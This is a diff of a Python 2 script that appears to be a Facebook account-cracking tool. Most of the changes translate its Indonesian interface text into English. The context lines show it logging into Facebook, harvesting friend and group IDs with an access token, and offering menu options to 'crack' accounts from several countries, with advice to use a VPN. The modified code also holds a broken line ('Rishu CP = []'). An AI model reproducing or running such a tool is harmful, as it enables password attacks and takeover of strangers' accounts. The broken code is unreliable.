@@ -52,7 +52,7 @@ def tik():
     titik = [
      '.   ', '..  ', '... ']
     for o in titik:
-        print '\x1b[1;91m\r[\xe2\x97\x8f] \x1b[92mSedang masuk ' + o,
+        print '\x1b[1;91m\r[\xe2\x97\x8f] \x1b[92mLogin Account ' + o,
         sys.stdout.flush()
         time.sleep(1)
 
@@ -60,8 +60,8 @@ def tik():
 back = 0
 threads = []
 berhasil = []
-cekpoint = []
-oks = []
+Rishu CP = []
+Oks = []
 id = []
 listgrup = []
 vulnot = '\x1b[31mNot Vuln'
@@ -76,13 +76,13 @@ def login():
         os.system('clear')
         print logo
         print '\x1b[91m[\xe2\x98\x86] \x1b[92mLOGIN WITH FACEBOOK ACCOUNT \x1b[91m[\xe2\x98\x86]'
-        id = raw_input('\x1b[00m[+] \x1b[92mID/Email \x1b[00m: \x1b[1;00m')
+        id = raw_input('\x1b[00m[+] \x1b[92mID/Email/Number \x1b[00m: \x1b[1;00m')
         pwd = raw_input('\x1b[00m[+] \x1b[92mPassword \x1b[00m: \x1b[00m')
         tik()
         try:
             br.open('https://m.facebook.com')
         except mechanize.URLError:
-            print '\n\x1b[00m[!] \x1b[1;91mTidak ada koneksi'
+            print '\n\x1b[00m[!] \x1b[1;91mNo Connection'
             keluar()
 
         br._factory.is_html = True
@@ -110,11 +110,11 @@ def login():
                 os.system('xdg-open https://www.facebook.com/Rishu.X.420')
                 menu()
             except requests.exceptions.ConnectionError:
-                print '\n\x1b[1;96m[!] \x1b[1;91mTidak ada koneksi'
+                print '\n\x1b[1;96m[!] \x1b[1;91mNo Connection'
                 keluar()
 
         if 'checkpoint' in url:
-            print '\n\x1b[1;96m[!] \x1b[1;91mSepertinya akun anda kena checkpoint'
+            print '\n\x1b[1;96m[!] \x1b[1;91myour account  a checkpoint'
             os.system('rm -rf login.txt')
             time.sleep(1)
             keluar()
@@ -148,14 +148,14 @@ def menu():
         time.sleep(1)
         login()
     except requests.exceptions.ConnectionError:
-        print '\x1b[1;96m[!] \x1b[1;91mTidak ada koneksi'
+        print '\x1b[1;96m[!] \x1b[1;91mNo Connection'
         keluar()
 
     os.system('clear')
     print logo
-    print '\x1b[92mSelamat datang\x1b[00m ' + nama + '\x1b[00m'
+    print '\x1b[92mWelcome\x1b[00m ' + nama + '\x1b[00m'
     print 42 * '\x1b[00m-'
-    print '\x1b[1;97m1.\x1b[1;93m Crack account Indo/Pakistan/Bangladesh '
+    print '\x1b[1;97m1.\x1b[1;93m Crack account Indo/Pakistan/Bangladesh/India '
     print '\x1b[1;97m2.\x1b[1;93m Crack account Random      '
     print '\n\x1b[1;91m0.\x1b[1;91m Logout            '
     pilih()
@@ -164,7 +164,7 @@ def menu():
 def pilih():
     unikers = raw_input('\n\x1b[00m >>\x1b[92m')
     if unikers == '':
-        print '\x1b[00m[!] \x1b[1;91mIsi yang benar'
+        print '\x1b[00m[!] \x1b[1;91mCorrect Contents'
         pilih()
     elif unikers == '1':
         super()
@@ -172,11 +172,11 @@ def pilih():
         super()
     elif unikers == '0':
         os.system('clear')
-        jalan('Menghapus token')
+        jalan('Delete token')
         os.system('rm -rf login.txt')
         keluar()
     else:
-        print '\x1b[00m[!] \x1b[1;91mIsi yang benar'
+        print '\x1b[00m[!] \x1b[1;91mCorrect contents'
         pilih()
 
 
@@ -223,10 +223,10 @@ def pilih_super():
             try:
                 jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                 op = json.loads(jok.text)
-                print '\x1b[00m[\x1b[92m\xe2\x9c\x93\x1b[00m] \x1b[92mNama public\x1b[1;91m :\x1b[1;97m ' + op['name']
+                print '\x1b[00m[\x1b[92m\xe2\x9c\x93\x1b[00m] \x1b[92mName public\x1b[1;91m :\x1b[1;97m ' + op['name']
             except KeyError:
-                print '\x1b[00m[!] \x1b[91mTeman tidak ditemukan!'
-                raw_input('\n\x1b[00m[\x1b[92mKembali\x1b[00m]')
+                print '\x1b[00m[!] \x1b[91mFriends not found!'
+                raw_input('\n\x1b[00m[\x1b[92mReturn\x1b[00m]')
                 super()
 
             jalan('\x1b[00m[\xe2\x9c\xba] \x1b[92mTake ID \x1b[1;97m...')
@@ -242,10 +242,10 @@ def pilih_super():
             try:
                 r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                 asw = json.loads(r.text)
-                print '\x1b[00m[\x1b[92m\xe2\x9c\x93\x1b[00m] \x1b[92mNama group \x1b[1;91m:\x1b[1;97m ' + asw['name']
+                print '\x1b[00m[\x1b[92m\xe2\x9c\x93\x1b[00m] \x1b[92mName group \x1b[1;91m:\x1b[1;97m ' + asw['name']
             except KeyError:
-                print '\x1b[00m[!] \x1b[1;91mGroup tidak ditemukan'
-                raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
+                print '\x1b[00m[!] \x1b[1;91mGroups not found'
+                raw_input('\n\x1b[1;96m[\x1b[1;97mReturn\x1b[1;96m]')
                 super()
 
             jalan('\x1b[00m[\xe2\x9c\xba] \x1b[92mMengambil ID \x1b[1;97m...')
@@ -258,19 +258,19 @@ def pilih_super():
             os.system('clear')
             print logo
             try:
-                idlist = raw_input('\x1b[00m[+] \x1b[92mMasukan nama file  \x1b[00m: \x1b[00m')
+                idlist = raw_input('\x1b[00m[+] \x1b[92mInput name file  \x1b[00m: \x1b[00m')
                 for line in open(idlist, 'r').readlines():
                     id.append(line.strip())
 
             except IOError:
-                print '\x1b[00m[!] \x1b[1;91mFile tidak ditemukan'
-                raw_input('\n\x1b[00m[ \x1b[91mKembali \x1b[00m]')
+                print '\x1b[00m[!] \x1b[1;91mFile not found'
+                raw_input('\n\x1b[00m[ \x1b[91mReturn \x1b[00m]')
                 super()
 
         elif peak == '0':
             menu()
         else:
-            print '\x1b[00m[!] \x1b[1;91mIsi yang benar'
+            print '\x1b[00m[!] \x1b[1;91mCorrect contents'
             pilih_super()
         print '\x1b[92m[+] \x1b[00mTotal ID \x1b[00m: \x1b[92m' + str(len(id))
         titik = ['.   ', '..  ', '... ']
@@ -280,7 +280,7 @@ def pilih_super():
             time.sleep(1)
 
     print
-    print '\x1b[1;92m[!] \x1b[00mLebih cepat gunakan VPN Brazil/US'
+    print '\x1b[1;92m[!] \x1b[00mFaster use VPN Brazil/US/Singapore'
     print 42 * '\x1b[00m-'
 
     def main(arg):
